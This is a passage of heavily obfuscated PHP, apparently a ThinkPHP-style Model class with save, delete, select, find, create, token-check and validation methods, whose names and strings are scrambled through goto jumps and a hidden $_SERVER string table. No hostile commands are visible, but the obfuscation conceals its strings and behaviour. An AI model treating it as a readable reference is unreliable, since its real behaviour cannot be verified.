$Aõ¡ª‘ˆöï = '', $A£ƒœîİ = array()) { $b¾ÂÃ–ù”¸ =& $_SERVER[¦·]; $A£ƒœîİ = $this->_parseOptions($A£ƒœîİ); if (!1 === ($b–•ó™õÕ = $this->db->selectInsert($DÜĞŸÖ½ » ? $DÜĞŸÖ½ » : $A£ƒœîİ[$b¾ÂÃ–ù”¸[261]], $Aõ¡ª‘ˆöï ? $Aõ¡ª‘ˆöï : $this->getTableName(), $A£ƒœîİ))) { $this->error = think_lang($b¾ÂÃ–ù”¸[262]); return !1; } else { return $b–•ó™õÕ; } } public function save($CŸˆ¿Á‰Ô = '', $eë·ÕÁµí  = array()) { goto d’î™ ÷’; D¨„‰„Í’: if (is_array($eë·ÕÁµí [$eÎ¬šè‰¦¡[263]]) && isset($eë·ÕÁµí [$eÎ¬šè‰¦¡[263]][$E³™éæ°°À])) { $C”°¾¨Ï¨á = $eë·ÕÁµí [$eÎ¬šè‰¦¡[263]][$E³™éæ°°À]; } if (!1 === $this->_beforeUpdate($CŸˆ¿Á‰Ô, $eë·ÕÁµí )) { return !1; } $E©µ£Š¬êÊ = $this->db->update($CŸˆ¿Á‰Ô, $eë·ÕÁµí ); goto C…®®‹ğŸÚ; C…®®‹ğŸÚ: if (!1 !== $E©µ£Š¬êÊ) { if (isset($C”°¾¨Ï¨á)) { $CŸˆ¿Á‰Ô[$E³™éæ°°À] = $C”°¾¨Ï¨á; } $this->_afterUpdate($CŸˆ¿Á‰Ô, $eë·ÕÁµí ); } return $E©µ£Š¬êÊ; goto fÁ³™ŸåÈ; d’î™ ÷’: $eÎ¬šè‰¦¡ =& $_SERVER[¦·]; if (empty($CŸˆ¿Á‰Ô)) { if (!empty($this->data)) { $CŸˆ¿Á‰Ô = $this->data; $this->data = array(); } else { $this->error = think_lang($eÎ¬šè‰¦¡[259]); return !1; } } $CŸˆ¿Á‰Ô = $this->_facade($CŸˆ¿Á‰Ô); goto fìÚµ²ˆÀ; fìÚµ²ˆÀ: $eë·ÕÁµí  = $this->_parseOptions($eë·ÕÁµí ); $E³™éæ°°À = $this->getPk(); if (!isset($eë·ÕÁµí [$eÎ¬šè‰¦¡[263]])) { if (isset($CŸˆ¿Á‰Ô[$E³™éæ°°À])) { $e§Ö†Óëø[$E³™éæ°°À] = $CŸˆ¿Á‰Ô[$E³™éæ°°À]; $eë·ÕÁµí [$eÎ¬šè‰¦¡[263]] = $e§Ö†Óëø; unset($CŸˆ¿Á‰Ô[$E³™éæ°°À]); } else { $this->error = think_lang($eÎ¬šè‰¦¡[262]); return !1; } } goto D¨„‰„Í’; fÁ³™ŸåÈ: } protected function _beforeUpdate(&$bŸÂÂè‰ÇÍ, $bè†•ÅŒá¶) { } protected function _afterUpdate($F„ÁğÒÊõ , $E¾ÔÎÂ¸Ëé) { } public function delete($bšÅê¨Ğ¹Š = array()) { goto FÊ˜•ŠÚÆ“; f Ä´á²É: $d·É³Õàã§ = $this->db->delete($bšÅê¨Ğ¹Š); if (!1 !== $d·É³Õàã§) { $BÀ¸É¨Óáô = array(); if (isset($B„•êèÓ¯İ)) { $BÀ¸É¨Óáô[$fÊÇ“¢‚àÁ] = $B„•êèÓ¯İ; } $this->_after_delete($BÀ¸É¨Óáô, $bšÅê¨Ğ¹Š); } return $d·É³Õàã§; goto dƒ‰£…áëµ; DÚÁ„¼©•õ: if (is_numeric($bšÅê¨Ğ¹Š) || is_string($bšÅê¨Ğ¹Š)) { if (strpos($bšÅê¨Ğ¹Š, $FØĞÆâÎ[47])) { $C’Ø—¨¸ˆÅ[$fÊÇ“¢‚àÁ] = array($FØĞÆâÎ[264], $bšÅê¨Ğ¹Š); } else { $C’Ø—¨¸ˆÅ[$fÊÇ“¢‚àÁ] = $bšÅê¨Ğ¹Š; } $this->options[$FØĞÆâÎ[263]] = $C’Ø—¨¸ˆÅ; } $bšÅê¨Ğ¹Š = $this->_parseOptions(); if (is_array($bšÅê¨Ğ¹Š[$FØĞÆâÎ[263]]) && isset($bšÅê¨Ğ¹Š[$FØĞÆâÎ[263]][$fÊÇ“¢‚àÁ])) { $B„•êèÓ¯İ = $bšÅê¨Ğ¹Š[$FØĞÆâÎ[263]][$fÊÇ“¢‚àÁ]; } goto f Ä´á²É; FÊ˜•ŠÚÆ“: $FØĞÆâÎ =& $_SERVER[¦·]; if (empty($bšÅê¨Ğ¹Š) && empty($this->options[$FØĞÆâÎ[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $fÊÇ“¢‚àÁ = $this->getPk(); goto DÚÁ„¼©•õ; dƒ‰£…áëµ: } protected function _after_delete($C‘Ç¶í­öª, $EÔğ²ÙÌÕ×) { } public function select($EíÃ÷‡İ‹¹ = array()) { goto aÉª¶ÎÚÙ; AÖ¶¿÷Ëğë: $Fõá°Ìİ¤¨ = $this->db->select($EíÃ÷‡İ‹¹); if (!1 === $Fõá°Ìİ¤¨) { return !1; } if (empty($Fõá°Ìİ¤¨)) { return null; } goto aù¿Õ­ØÃ; aÉª¶ÎÚÙ: $CßÆğî„·ğ =& $_SERVER[¦·]; if (is_string($EíÃ÷‡İ‹¹) || is_numeric($EíÃ÷‡İ‹¹)) { $D‘³Šä¤³à = $this->getPk(); if (strpos($EíÃ÷‡İ‹¹, $CßÆğî„·ğ[47])) { $FäõğÏ“·Ä[$D‘³Šä¤³à] = array($CßÆğî„·ğ[264], $EíÃ÷‡İ‹¹); } else { $FäõğÏ“·Ä[$D‘³Šä¤³à] = $EíÃ÷‡İ‹¹; } $this->options[$CßÆğî„·ğ[263]] = $FäõğÏ“·Ä; } elseif (!1 === $EíÃ÷‡İ‹¹) { $EíÃ÷‡İ‹¹ = $this->_parseOptions(); return $CßÆğî„·ğ[265] . $this->db->buildSelectSql($EíÃ÷‡İ‹¹) . $CßÆğî„·ğ[266]; } $EíÃ÷‡İ‹¹ = $this->_parseOptions(); goto AÖ¶¿÷Ëğë; aù¿Õ­ØÃ: $this->_afterSelect($Fõá°Ìİ¤¨, $EíÃ÷‡İ‹¹); return $Fõá°Ìİ¤¨; goto a–çå‚¢Ñ½; a–çå‚¢Ñ½: } protected function _afterSelect(&$CŠÄî°Ÿ‹‡, $Cë—¥Û‚«Ç) { } public function buildSql($aíŠ«åôÁÔ = array()) { $A«›®±§Î« =& $_SERVER[¦·]; $aíŠ«åôÁÔ = $this->_parseOptions($aíŠ«åôÁÔ); return $A«›®±§Î«[265] . $this->db->buildSelectSql($aíŠ«åôÁÔ) . $A«›®±§Î«[266]; } public function optionsValue($FëÃ’Û÷æ‡ = null) { if (is_null($FëÃ’Û÷æ‡)) { return $this->options; } elseif (is_array($FëÃ’Û÷æ‡)) { $this->options = array_merge($this->options, $FëÃ’Û÷æ‡); } } protected function _parseOptions($D¨Ú­•à² = array()) { goto BëÏè¦ÄÔ; d“ÃÜ…Û’: if (!isset($D¨Ú­•à²[$E¼ÛÒÍˆ¤Ø[267]])) { $D¨Ú­•à²[$E¼ÛÒÍˆ¤Ø[267]] = $this->getTableName(); $dß´¼¸•È = $this->fields; } else { $dß´¼¸•È = $this->getDbFields(); } if (!empty($D¨Ú­•à²[$E¼ÛÒÍˆ¤Ø[268]])) { $D¨Ú­•à²[$E¼ÛÒÍˆ¤Ø[267]] .= $E¼ÛÒÍˆ¤Ø[50] . $D¨Ú­•à²[$E¼ÛÒÍˆ¤Ø[268]]; } $D¨Ú­•à²[$E¼ÛÒÍˆ¤Ø[269]] = $this->name; goto cİ¹‚ÊôåÎ; BëÏè¦ÄÔ: $E¼ÛÒÍˆ¤Ø =& $_SERVER[¦·]; if (is_array($D¨Ú­•à²)) { $D¨Ú­•à² = array_merge($this->options, $D¨Ú­•à²); } $this->options = array(); goto d“ÃÜ…Û’; cİ¹‚ÊôåÎ: if (isset($D¨Ú­•à²[$E¼ÛÒÍˆ¤Ø[263]]) && is_array($D¨Ú­•à²[$E¼ÛÒÍˆ¤Ø[263]]) && !empty($dß´¼¸•È) && !isset($D¨Ú­•à²[$E¼ÛÒÍˆ¤Ø[270]]) && !isset($D¨Ú­•à²[$E¼ÛÒÍˆ¤Ø[267]])) { foreach ($D¨Ú­•à²[$E¼ÛÒÍˆ¤Ø[263]] as $c÷í‹§—æˆ => $d¶»í§óõ) { $c÷í‹§—æˆ = trim($c÷í‹§—æˆ); if (in_array($c÷í‹§—æˆ, $dß´¼¸•È, !0)) { if (is_scalar($d¶»í§óõ)) { $this->_parseType($D¨Ú­•à²[$E¼ÛÒÍˆ¤Ø[263]], $c÷í‹§—æˆ); } } elseif (!is_numeric($c÷í‹§—æˆ) && $E¼ÛÒÍˆ¤Ø[70] != substr($c÷í‹§—æˆ, 0, 1) && !1 === strpos($c÷í‹§—æˆ, $E¼ÛÒÍˆ¤Ø[91]) && !1 === strpos($c÷í‹§—æˆ, $E¼ÛÒÍˆ¤Ø[248]) && !1 === strpos($c÷í‹§—æˆ, $E¼ÛÒÍˆ¤Ø[271]) && !1 === strpos($c÷í‹§—æˆ, $E¼ÛÒÍˆ¤Ø[272])) { unset($D¨Ú­•à²[$E¼ÛÒÍˆ¤Ø[263]][$c÷í‹§—æˆ]); } } } $this->_options_filter($D¨Ú­•à²); return $D¨Ú­•à²; goto Fƒø…ËÙÌï; Fƒø…ËÙÌï: } protected function _options_filter(&$a¾š­Ü”“‰) { } protected function _parseType(&$EêØ”¨¼ßÄ, $d™ƒˆĞÇ‚») { $cêëÛ ÌŠ =& $_SERVER[¦·]; if (empty($this->options[$cêëÛ ÌŠ[273]][$cêëÛ ÌŠ[4] . $d™ƒˆĞÇ‚»])) { $Dá÷ÛÛÜÒ£ = strtolower($this->fields[$cêëÛ ÌŠ[240]][$d™ƒˆĞÇ‚»]); if (!1 !== strpos($Dá÷ÛÛÜÒ£, $cêëÛ ÌŠ[274])) { } elseif (!1 === strpos($Dá÷ÛÛÜÒ£, $cêëÛ ÌŠ[275]) && !1 !== strpos($Dá÷ÛÛÜÒ£, $cêëÛ ÌŠ[276])) { $EêØ”¨¼ßÄ[$d™ƒˆĞÇ‚»] = intval($EêØ”¨¼ßÄ[$d™ƒˆĞÇ‚»]); } elseif (!1 !== strpos($Dá÷ÛÛÜÒ£, $cêëÛ ÌŠ[277]) || !1 !== strpos($Dá÷ÛÛÜÒ£, $cêëÛ ÌŠ[278])) { $EêØ”¨¼ßÄ[$d™ƒˆĞÇ‚»] = floatval($EêØ”¨¼ßÄ[$d™ƒˆĞÇ‚»]); } elseif (!1 !== strpos($Dá÷ÛÛÜÒ£, $cêëÛ ÌŠ[279])) { $EêØ”¨¼ßÄ[$d™ƒˆĞÇ‚»] = (bool) $EêØ”¨¼ßÄ[$d™ƒˆĞÇ‚»]; } } } public function find($cŞÃĞÔæè¡ = array()) { goto E„Ê„ÊÜà´; E„Ê„ÊÜà´: $bƒÛ¢¡ï˜ö =& $_SERVER[¦·]; if (is_numeric($cŞÃĞÔæè¡) || is_string($cŞÃĞÔæè¡)) { $e¡¡ÄÕ…ÅŞ[$this->getPk()] = intval($cŞÃĞÔæè¡); $this->options[$bƒÛ¢¡ï˜ö[263]] = $e¡¡ÄÕ…ÅŞ; } $this->options[$bƒÛ¢¡ï˜ö[280]] = 1; goto A“Â¹ÚÅä; d¤ï³‹ê…: if (!empty($this->options[$bƒÛ¢¡ï˜ö[281]])) { return $this->returnResult($this->data, $this->options[$bƒÛ¢¡ï˜ö[281]]); } return $this->data; goto d¶œìÍÆ®¡; A“Â¹ÚÅä: $cŞÃĞÔæè¡ = $this->_parseOptions(); $FÇ¿À”ÛÖ = $this->db->select($cŞÃĞÔæè¡); if (!1 === $FÇ¿À”ÛÖ) { return !1; } goto Aî×ª¦¨¯’; Aî×ª¦¨¯’: if (empty($FÇ¿À”ÛÖ)) { return null; } $this->data = $FÇ¿À”ÛÖ[0]; $this->_afterFind($this->data, $cŞÃĞÔæè¡); goto d¤ï³‹ê…; d¶œìÍÆ®¡: } protected function _afterFind(&$fº¨Åêİ, $d»ÙîìÑÙÎ) { } protected function returnResult($DÔ‰ÓÚ¼¹, $d‡«Ùˆö†† = '') { $Aœº·ÚÚáò =& $_SERVER[¦·]; if ($d‡«Ùˆö††) { if (is_callable($d‡«Ùˆö††)) { return call_user_func($d‡«Ùˆö††, $DÔ‰ÓÚ¼¹); } switch (strtolower($d‡«Ùˆö††)) { case $Aœº·ÚÚáò[282]: return json_encode($DÔ‰ÓÚ¼¹); case $Aœº·ÚÚáò[283]: return xml_encode($DÔ‰ÓÚ¼¹); } } return $DÔ‰ÓÚ¼¹; } public function parseFieldsMap($C‰ß¾˜÷è•, $cÙÓ“Ê¤Œ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $c±ö™Š¡  => $C‹‰ãè¥¦Ú) { if ($cÙÓ“Ê¤Œ == 1) { if (isset($C‰ß¾˜÷è•[$C‹‰ãè¥¦Ú])) { $C‰ß¾˜÷è•[$c±ö™Š¡ ] = $C‰ß¾˜÷è•[$C‹‰ãè¥¦Ú]; unset($C‰ß¾˜÷è•[$C‹‰ãè¥¦Ú]); } } else { if (isset($C‰ß¾˜÷è•[$c±ö™Š¡ ])) { $C‰ß¾˜÷è•[$C‹‰ãè¥¦Ú] = $C‰ß¾˜÷è•[$c±ö™Š¡ ]; unset($C‰ß¾˜÷è•[$c±ö™Š¡ ]); } } } } return $C‰ß¾˜÷è•; } public function setField($e¹ï ¡©, $d†›œà±ËÙ = '') { if (is_array($e¹ï ¡©)) { $dƒ‚‘Ç¸ò¤ = $e¹ï ¡©; } else { $dƒ‚‘Ç¸ò¤[$e¹ï ¡©] = $d†›œà±ËÙ; } return $this->save($dƒ‚‘Ç¸ò¤); } public function setAdd($FÒë·–ªçÏ, $AÆëøåÓ = 1) { $CÃôÅâ…ç =& $_SERVER[¦·]; $cÛÔÙçì = $FÒë·–ªçÏ . $CÃôÅâ…ç[284] . $AÆëøåÓ; if ($AÆëøåÓ < 0) { $cÛÔÙçì = $FÒë·–ªçÏ . $AÆëøåÓ; } return $this->setField($FÒë·–ªçÏ, array($CÃôÅâ…ç[285], $cÛÔÙçì)); } public function getField($a‡ªá›Ÿä©, $F×çÜ£É‘Ö = null) { $AÇ³®Œ³½º =& $_SERVER[¦·]; $AÌ¢¿„ïÉ¹[$AÇ³®Œ³½º[261]] = $a‡ªá›Ÿä©; $AÌ¢¿„ïÉ¹ = $this->_parseOptions($AÌ¢¿„ïÉ¹); $a‡ªá›Ÿä© = trim($a‡ªá›Ÿä©); if (strpos($a‡ªá›Ÿä©, $AÇ³®Œ³½º[47])) { if (!isset($AÌ¢¿„ïÉ¹[$AÇ³®Œ³½º[280]])) { $AÌ¢¿„ïÉ¹[$AÇ³®Œ³½º[280]] = is_numeric($F×çÜ£É‘Ö) ? $F×çÜ£É‘Ö : $AÇ³®Œ³½º[33]; } $E‚¿ÉçæóÎ = $this->db->select($AÌ¢¿„ïÉ¹); if (!empty($E‚¿ÉçæóÎ)) { goto BŒ…¸Ë¼öÁ; d“½¯‰ Ä²: foreach ($E‚¿ÉçæóÎ as $cÇèƒ²Ş‹ö) { $f‹·Ù¨¯ğ = $cÇèƒ²Ş‹ö[$FáãåÈ³¦å]; if (2 == $b‰×÷Âš) { $BÂš›‘ÈçÈ[$f‹·Ù¨¯ğ] = $cÇèƒ²Ş‹ö[$eÄä­åÛ]; } else { $BÂš›‘ÈçÈ[$f‹·Ù¨¯ğ] = is_string($F×çÜ£É‘Ö) ? implode($F×çÜ£É‘Ö, $cÇèƒ²Ş‹ö) : $cÇèƒ²Ş‹ö; } } return $BÂš›‘ÈçÈ; goto d¶¬ÅÔÎÇ; b°ŸöÉ÷èğ: $eÄä­åÛ = array_shift($a‡ªá›Ÿä©); $BÂš›‘ÈçÈ = array(); $b‰×÷Âš = count($d›­İ¨Ìëã); goto d“½¯‰ Ä²; BŒ…¸Ë¼öÁ: $d›­İ¨Ìëã = explode($AÇ³®Œ³½º[47], $a‡ªá›Ÿä©); $a‡ªá›Ÿä© = array_keys($E‚¿ÉçæóÎ[0]); $FáãåÈ³¦å = array_shift($a‡ªá›Ÿä©); goto b°ŸöÉ÷èğ; d¶¬ÅÔÎÇ: } } else { if (!0 !== $F×çÜ£É‘Ö) { $AÌ¢¿„ïÉ¹[$AÇ³®Œ³½º[280]] = is_numeric($F×çÜ£É‘Ö) ? $F×çÜ£É‘Ö : 1; } if ($F×çÜ£É‘Ö === $AÇ³®Œ³½º[243]) { unset($AÌ¢¿„ïÉ¹[$AÇ³®Œ³½º[280]]); } $cÇèƒ²Ş‹ö = $this->db->select($AÌ¢¿„ïÉ¹); if (!empty($cÇèƒ²Ş‹ö)) { if ($F×çÜ£É‘Ö === $AÇ³®Œ³½º[243]) { return reset($cÇèƒ²Ş‹ö[0]); } if (!0 !== $F×çÜ£É‘Ö && 1 == $AÌ¢¿„ïÉ¹[$AÇ³®Œ³½º[280]]) { return reset($cÇèƒ²Ş‹ö[0]); } foreach ($cÇèƒ²Ş‹ö as $e©ÂÕèßÙ¤) { $E¯®Ô¢‹”Ì[] = $e©ÂÕèßÙ¤[$a‡ªá›Ÿä©]; } return $E¯®Ô¢‹”Ì; } } return null; } public function create($BáÜæÎ…öô = '', $B·›¢£Îá½ = '') { goto B§¬ğÃ…¡; A‡ƒáé®åĞ: $BáÜæÎ…öô = $this->parseFieldsMap($BáÜæÎ…öô, 0); $B·›¢£Îá½ = $B·›¢£Îá½ ? $B·›¢£Îá½ : (!empty($BáÜæÎ…öô[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Eø‘Èğ ˆ…[261]])) { $A‚——½¿Çª = $this->options[$Eø‘Èğ ˆ…[261]]; unset($this->options[$Eø‘Èğ ˆ…[261]]); } elseif ($B·›¢£Îá½ == THINK_MODEL_INSERT && isset($this->insertFields)) { $A‚——½¿Çª = $this->insertFields; } elseif ($B·›¢£Îá½ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $A‚——½¿Çª = $this->updateFields; } goto B¤§ò¸†àÉ; FÏºÄ®—¼Ó: if ($this->autoCheckFields) { $A‚——½¿Çª = $this->getDbFields(); foreach ($BáÜæÎ…öô as $dâÚ­’Ã›Ê => $C¶êÎ®Û§) { if (!in_array($dâÚ­’Ã›Ê, $A‚——½¿Çª)) { unset($BáÜæÎ…öô[$dâÚ­’Ã›Ê]); } elseif (MAGIC_QUOTES_GPC && is_string($C¶êÎ®Û§)) { $BáÜæÎ…öô[$dâÚ­’Ã›Ê] = stripslashes($C¶êÎ®Û§); } } } $this->autoOperation($BáÜæÎ…öô, $B·›¢£Îá½); $this->data = $BáÜæÎ…öô; goto DÏÌå„Ëù; DÏÌå„Ëù: return $BáÜæÎ…öô; goto DÃºÚì°ƒ; B¤§ò¸†àÉ: if (isset($A‚——½¿Çª)) { if (is_string($A‚——½¿Çª)) { $A‚——½¿Çª = explode($Eø‘Èğ ˆ…[47], $A‚——½¿Çª); } if (think_config($Eø‘Èğ ˆ…[286])) { $A‚——½¿Çª[] = think_config($Eø‘Èğ ˆ…[287]); } foreach ($BáÜæÎ…öô as $dâÚ­’Ã›Ê => $C¶êÎ®Û§) { if (!in_array($dâÚ­’Ã›Ê, $A‚——½¿Çª)) { unset($BáÜæÎ…öô[$dâÚ­’Ã›Ê]); } } } if (!$this->autoValidation($BáÜæÎ…öô, $B·›¢£Îá½)) { return !1; } if (!$this->autoCheckToken($BáÜæÎ…öô)) { $this->error = think_lang($Eø‘Èğ ˆ…[288]); return !1; } goto FÏºÄ®—¼Ó; B§¬ğÃ…¡: $Eø‘Èğ ˆ… =& $_SERVER[¦·]; if (empty($BáÜæÎ…öô)) { $BáÜæÎ…öô = $_POST; } elseif (is_object($BáÜæÎ…öô)) { $BáÜæÎ…öô = get_object_vars($BáÜæÎ…öô); } if (empty($BáÜæÎ…öô) || !is_array($BáÜæÎ…öô)) { $this->error = think_lang($Eø‘Èğ ˆ…[259]); return !1; } goto A‡ƒáé®åĞ; DÃºÚì°ƒ: } public function autoCheckToken($féÜ‘‚Ó²) { $BíÀ¹ŸË” =& $_SERVER[¦·]; if (isset($this->options[$BíÀ¹ŸË”[289]]) && !$this->options[$BíÀ¹ŸË”[289]]) { return !0; } if (think_config($BíÀ¹ŸË”[286])) { $B»ˆÚšÉÖğ = think_config($BíÀ¹ŸË”[287]); if (!isset($féÜ‘‚Ó²[$B»ˆÚšÉÖğ]) || Session::get($B»ˆÚšÉÖğ)) { return !1; } list($fäˆ—‹‰ËŒ, $C÷¯ÅŞ®÷œ) = explode($BíÀ¹ŸË”[70], $féÜ‘‚Ó²[$B»ˆÚšÉÖğ]); if ($C÷¯ÅŞ®÷œ && Session::get($B»ˆÚšÉÖğ . $BíÀ¹ŸË”[91] . $fäˆ—‹‰ËŒ) === $C÷¯ÅŞ®÷œ) { Session::remove($B»ˆÚšÉÖğ . $BíÀ¹ŸË”[91] . $fäˆ—‹‰ËŒ); return !0; } if (think_config($BíÀ¹ŸË”[290])) { Session::remove($B»ˆÚšÉÖğ . $BíÀ¹ŸË”[91] . $fäˆ—‹‰ËŒ); } return !1; } return !0; } public function regex($Cë„Ñµ®ä, $d±–ÊÊÜŒ) { $E²İ‰ğË¢ä =& $_SERVER[¦·]; $dé…”Šö† = array($E²İ‰ğË¢ä[291] => $E²İ‰ğË¢ä[292], $E²İ‰ğË¢ä[293] => $E²İ‰ğË¢ä[294], $E²İ‰ğË¢ä[295] => $E²İ‰ğË¢ä[296], $E²İ‰ğË¢ä[297] => $E²İ‰ğË¢ä[298], $E²İ‰ğË¢ä[299] => $E²İ‰ğË¢ä[300], $E²İ‰ğË¢ä[301] => $E²İ‰ğË¢ä[302], $E²İ‰ğË¢ä[303] => $E²İ‰ğË¢ä[304], $E²İ‰ğË¢ä[278] => $E²İ‰ğË¢ä[305], $E²İ‰ğË¢ä[306] => $E²İ‰ğË¢ä[307]); if (isset($dé…”Šö†[strtolower($d±–ÊÊÜŒ)])) { $d±–ÊÊÜŒ = $dé…”Šö†[strtolower($d±–ÊÊÜŒ)]; } return preg_match($d±–ÊÊÜŒ, $Cë„Ñµ®ä) === 1; } private function autoOperation(&$c‚ÊĞò÷å, $fßÔÜ³çêã) { $AÛĞæéŸó =& $_SERVER[¦·]; if (!empty($this->options[$AÛĞæéŸó[308]])) { $f±í³Û¤„– = $this->options[$AÛĞæéŸó[308]]; unset($this->options[$AÛĞæéŸó[308]]); } elseif (!empty($this->_auto)) { $f±í³Û¤„– = $this->_auto; } if (isset($f±í³Û¤„–)) { foreach ($f±í³Û¤„– as $f­ª¬‚İ®£) { if (empty($f­ª¬‚İ®£[2])) { $f­ª¬‚İ®£[2] = THINK_MODEL_INSERT; } if ($fßÔÜ³çêã == $f­ª¬‚İ®£[2] || $f­ª¬‚İ®£[2] == THINK_MODEL_BOTH) { switch (trim($f­ª¬‚İ®£[3])) { case $AÛĞæéŸó[309]: case $AÛĞæéŸó[310]: $f¥…İ«Ğ¨‡ = isset($f­ª¬‚İ®£[4]) ? (array) $f­ª¬‚İ®£[4] : array(); if (isset($c‚ÊĞò÷å[$f­ª¬‚İ®£[0]])) { array_unshift($f¥…İ«Ğ¨‡, $c‚ÊĞò÷å[$f­ª¬‚İ®£[0]]); } if ($AÛĞæéŸó[309] == $f­ª¬‚İ®£[3]) { $c‚ÊĞò÷å[$f­ª¬‚İ®£[0]] = call_user_func_array($f­ª¬‚İ®£[1], $f¥…İ«Ğ¨‡); } else { $c‚ÊĞò÷å[$f­ª¬‚İ®£[0]] = call_user_func_array(array(&$this, $f­ª¬‚İ®£[1]), $f¥…İ«Ğ¨‡); } break; case $AÛĞæéŸó[261]: $c‚ÊĞò÷å[$f­ª¬‚İ®£[0]] = $c‚ÊĞò÷å[$f­ª¬‚İ®£[1]]; break; case $AÛĞæéŸó[311]: if ($AÛĞæéŸó[33] === $c‚ÊĞò÷å[$f­ª¬‚İ®£[0]]) { unset($c‚ÊĞò÷å[$f­ª¬‚İ®£[0]]); } break; case $AÛĞæéŸó[312]: default: $c‚ÊĞò÷å[$f­ª¬‚İ®£[0]] = $f­ª¬‚İ®£[1]; } if (!1 === $c‚ÊĞò÷å[$f­ª¬‚İ®£[0]]) { unset($c‚ÊĞò÷å[$f­ª¬‚İ®£[0]]); } } } } return $c‚ÊĞò÷å; } protected function autoValidation($càáÊ´Š‰Ò, $d¦İ¨İ¾ÒÀ) { $FáÚ±­½ =& $_SERVER[¦·]; if (!empty($this->options[$FáÚ±­½[313]])) { $C‚ëƒÁÙ•’ = $this->options[$FáÚ±­½[313]]; unset($this->options[$FáÚ±­½[313]]); } elseif (!empty($this->_validate)) { $C‚ëƒÁÙ•’ = $this->_validate; } if (isset($C‚ëƒÁÙ•’)) { if ($this->patchValidate) { $this->error = array(); } foreach ($C‚ëƒÁÙ•’ as $Aç‰ôµß› => $e†ë¼„ÑÄš) { if (empty($e†ë¼„ÑÄš[5]) || $e†ë¼„ÑÄš[5] == THINK_MODEL_BOTH || $e†ë¼„ÑÄš[5] == $d¦İ¨İ¾ÒÀ) { if (0 == strpos($e†ë¼„ÑÄš[2], $FáÚ±­½[314]) && strpos($e†ë¼„ÑÄš[2], $FáÚ±­½[315])) { $e†ë¼„ÑÄš[2] = think_lang(substr($e†ë¼„ÑÄš[2], 2, -1)); } $e†ë¼„ÑÄš[3] = isset($e†ë¼„ÑÄš[3]) ? $e†ë¼„ÑÄš[3] : THINK_EXISTS_VALIDATE; $e†ë¼„ÑÄš[4] = isset($e†ë¼„ÑÄš[4]) ? $e†ë¼„ÑÄš[4] : $FáÚ±­½[316]; switch ($e†ë¼„ÑÄš[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($càáÊ´Š‰Ò, $e†ë¼„ÑÄš)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($FáÚ±­½[33] != trim($càáÊ´Š‰Ò[$e†ë¼„ÑÄš[0]])) { if (!1 === $this->_validationField($càáÊ´Š‰Ò, $e†ë¼„ÑÄš)) { return !1; } } break; default: if (isset($càáÊ´Š‰Ò[$e†ë¼„ÑÄš[0]])) { if (!1 === $this->_validationField($càáÊ´Š‰Ò, $e†ë¼„ÑÄš)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($eÜˆ¬É‹©, $D×ßÇÑ¦¶) { if (!1 === $this->_validationFieldItem($eÜˆ¬É‹©, $D×ßÇÑ¦¶)) { if ($this->patchValidate) { $this->error[$D×ßÇÑ¦¶[0]] = $D×ßÇÑ¦¶[2]; } else { $this->error = $D×ßÇÑ¦¶[2]; return !1; } } return; } protected function _validationFieldItem($fÂ›Ûíñ’ , $DÏŠ½±Š×Á) { $b”¶ÈóêŞ„ =& $_SERVER[¦·]; switch (strtolower(trim($DÏŠ½±Š×Á[4]))) { case $b”¶ÈóêŞ„[309]: case $b”¶ÈóêŞ„[310]: $C±‘™ß²®â = isset($DÏŠ½±Š×Á[6]) ? (array) $DÏŠ½±Š×Á[6] : array(); if (is_string($DÏŠ½±Š×Á[0]) && strpos($DÏŠ½±Š×Á[0], $b”¶ÈóêŞ„[47])) { $DÏŠ½±Š×Á[0] = explode($b”¶ÈóêŞ„[47], $DÏŠ½±Š×Á[0]); } if (is_array($DÏŠ½±Š×Á[0])) { foreach ($DÏŠ½±Š×Á[0] as $bù¸ª•æÌò) { $D¸çôÀ¥Ë[$bù¸ª•æÌò] = $fÂ›Ûíñ’ [$bù¸ª•æÌò]; } array_unshift($C±‘™ß²®â, $D¸çôÀ¥Ë); } else { array_unshift($C±‘™ß²®â, $fÂ›Ûíñ’ [$DÏŠ½±Š×Á[0]]); } if ($b”¶ÈóêŞ„[309] == $DÏŠ½±Š×Á[4]) { return call_user_func_array($DÏŠ½±Š×Á[1], $C±‘™ß²®â); } else { return call_user_func_array(array(&$this, $DÏŠ½±Š×Á[1]), $C±‘™ß²®â); } case $b”¶ÈóêŞ„[317]: return $fÂ›Ûíñ’ [$DÏŠ½±Š×Á[0]] == $fÂ›Ûíñ’ [$DÏŠ½±Š×Á[1]]; case $b”¶ÈóêŞ„[318]: if (is_string($DÏŠ½±Š×Á[0]) && strpos($DÏŠ½±Š×Á[0], $b”¶ÈóêŞ„[47])) { $DÏŠ½±Š×Á[0] = explode($b”¶ÈóêŞ„[47], $DÏŠ½±Š×Á[0]); } $c•ñ´ğ² = array(); if (is_array($DÏŠ½±Š×Á[0])) { foreach ($DÏŠ½±Š×Á[0] as $bù¸ª•æÌò) { $c•ñ´ğ²[$bù¸ª•æÌò] = $fÂ›Ûíñ’ [$bù¸ª•æÌò]; } } else { $c•ñ´ğ²[$DÏŠ½±Š×Á[0]] = $fÂ›Ûíñ’ [$DÏŠ½±Š×Á[0]]; } if (!empty($fÂ›Ûíñ’ [$this->getPk()])) { $c•ñ´ğ²[$this->getPk()] = array($b”¶ÈóêŞ„[319], $fÂ›Ûíñ’ [$this->getPk()]); } if ($this->where($c•ñ´ğ²)->find()) { return !1; } return !0; default: return $this->check($fÂ›Ûíñ’ [$DÏŠ½±Š×Á[0]], $DÏŠ½±Š×Á[1], $DÏŠ½±Š×Á[4]); } } public function check($FÓ¾Ğ¢‚ÀÊ, $eã‚ÃñÌ«Ã, $CŠÉÃáæÃä = "\162\145\x67\x65\x78") { $eğ›Âº«ôã =& $_SERVER[¦·]; $CŠÉÃáæÃä = strtolower(trim($CŠÉÃáæÃä)); switch ($CŠÉÃáæÃä) { case $eğ›Âº«ôã[7]: case $eğ›Âº«ôã[320]: $d£ÔêÉ¾à© = is_array($eã‚ÃñÌ«Ã) ? $eã‚ÃñÌ«Ã : explode($eğ›Âº«ôã[47], $eã‚ÃñÌ«Ã); return $CŠÉÃáæÃä == $eğ›Âº«ôã[7] ? 